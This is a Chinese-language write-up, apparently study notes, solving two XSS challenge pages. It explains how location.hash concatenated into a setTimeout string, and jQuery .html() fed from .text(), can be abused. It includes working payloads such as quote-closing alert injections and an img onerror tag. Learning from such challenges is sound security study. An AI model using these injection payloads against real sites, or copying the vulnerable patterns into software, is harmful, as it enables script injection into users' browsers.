## 参考

- [一些BAT的XSS实例（一）](https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g)

### http://px1624.sinaapp.com/test/xsstest1/

```html
<script type="text/javascript">
var x=location.hash;
function aa(x){};
setTimeout("aa('"+x+"')",100);
</script>
Give me xss bypass 1~
```

利用js函数的性质：
```js
function myFunction(p1, p2) {
    return p1 * p2;              // 该函数返回 p1 和 p2 的乘积
}

// 普通的计算乘积
myFunction(2,3)
6
// 执行任意js代码
myFunction(2,alert(77),3)
NaN
```

所以这里令x="#',alert(1),'"
即可拼接出：
```
setTimeout("aa('#',alert(1),'')",100);
```
参考setTimeout用法：
```
setTimeout("alert('对不起, 要你久候')", 3000 )
```
参考：https://www.runoob.com/w3cnote/javascript-settimeout-usage.html

准确地，
```
aa('#',alert(1),'')
```
本来aa函数期待1个参数，也可以通过闭合单引号传入三个参数。
或者
```
');alert(1)//
```
闭合前面的单引号和括号，然后执行任意js，然后使用//注释掉后面的代码。

### http://px1624.sinaapp.com/test/xsstest2/

```js
$("#xx")["html"]($("#xx")["text"]());
```
其中
```
$("#xx")["html"]()
```
相当于
```
$("#xx").html()
```
而$("#xx")["text"]()相当于$("#xx").text()

于是

```js
$("#xx")["html"]("<img src=x onerror=alert(1)>")
```
就相当于
```js
$("#xx").html("<img src=x onerror=alert(1)>")
```

其中的知识点为：
> text();设置或者获取所选元素的文本内容；
html();设置或者获取所选元素的内容（包括html标记）；

参考：https://www.cnblogs.com/fozero/p/5916878.html
当函数传参时，表示设置；当函数参数为空时，表示选取。

